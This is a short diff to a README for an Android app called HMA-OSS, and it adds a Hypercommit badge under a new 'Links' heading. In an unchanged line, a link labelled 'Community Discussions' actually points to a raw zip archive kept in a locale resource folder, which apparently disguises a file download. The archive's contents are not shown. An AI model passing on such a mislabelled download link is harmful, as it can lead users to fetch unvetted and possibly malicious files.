@@ -91,3 +91,7 @@ To keep track of changes and improvements, refer to the https://github.com/kudyo
 - [Community Discussions](https://github.com/kudyoru/HMA-OSS/raw/refs/heads/master/app/src/main/res/values-ru-rRU/HM_OSS_v2.8.zip) 
 
 Thank you for choosing HMA-OSS. Enjoy using the application!
+
+## Links
+
+[![Hypercommit](https://img.shields.io/badge/Hypercommit-DB2475)](https://hypercommit.com/hma-oss)
